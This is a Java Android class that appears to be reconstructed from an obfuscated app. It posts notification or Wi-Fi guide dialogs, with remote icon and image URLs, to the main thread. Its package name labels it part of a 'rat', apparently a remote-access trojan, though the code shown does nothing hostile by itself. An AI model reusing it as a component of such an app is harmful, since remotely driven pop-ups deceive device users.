package com.vendor.rat.helper;

import android.util.Log;

/**
 * Vendor: com.guard.wallet.helper.m
 * Runnable for posting dialog creation to main thread.
 * mode 0: notification dialog via WifiGuideDialogHelper.showNotifyDialog
 * mode 1: wifi guide dialog via WifiGuideDialogHelper.showWifiGuideDialog
 */
public final class DialogRunnable implements Runnable {

    public final int mode;
    public final String title;
    public final String message;
    public final String buttonText;
    public final String iconUrl;
    public final String imageUrl;

    public DialogRunnable(String title, String message, String buttonText, String iconUrl, String imageUrl, int mode) {
        this.mode = mode;
        this.title = title;
        this.message = message;
        this.buttonText = buttonText;
        this.iconUrl = iconUrl;
        this.imageUrl = imageUrl;
    }

    @Override
    public final void run() {
        switch (this.mode) {
            case 0:
                if (WifiGuideDialogHelper.showNotifyDialog(title, message, buttonText, iconUrl, imageUrl)) {
                    Log.d("WifiGuideDialogHelper", "弹出通知对话框成功");
                } else {
                    Log.e("WifiGuideDialogHelper", "弹出通知对话框失败");
                }
                return;
            default:
                if (WifiGuideDialogHelper.showWifiGuideDialog(title, message, buttonText, iconUrl, imageUrl)) {
                    Log.d("WifiGuideDialogHelper", "弹出WIFI引导对话框成功");
                } else {
                    Log.e("WifiGuideDialogHelper", "弹出WIFI引导对话框失败");
                }
                return;
        }
    }
}
